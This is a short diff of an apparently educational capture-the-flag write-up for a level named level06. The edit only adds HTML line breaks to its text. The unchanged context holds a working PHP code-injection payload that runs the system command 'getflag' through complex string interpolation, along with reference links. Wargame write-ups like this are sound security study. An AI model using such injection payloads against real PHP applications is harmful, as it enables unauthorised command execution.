@@ -81,6 +81,6 @@ and a lot of variants of it.
 
 To finally come accross the good syntax: `echo '[x {${system(getflag)}}]' > /tmp/flag && ./level06 /tmp/flag`
 
-`echo "This is the value of the var named $name: {${$name}}";`
-https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex
+`echo "This is the value of the var named $name: {${$name}}";` </br>
+https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex </br>
 https://www.voidsecurity.in/2012/12/exploit-exercise-php-pregreplace.html </br>
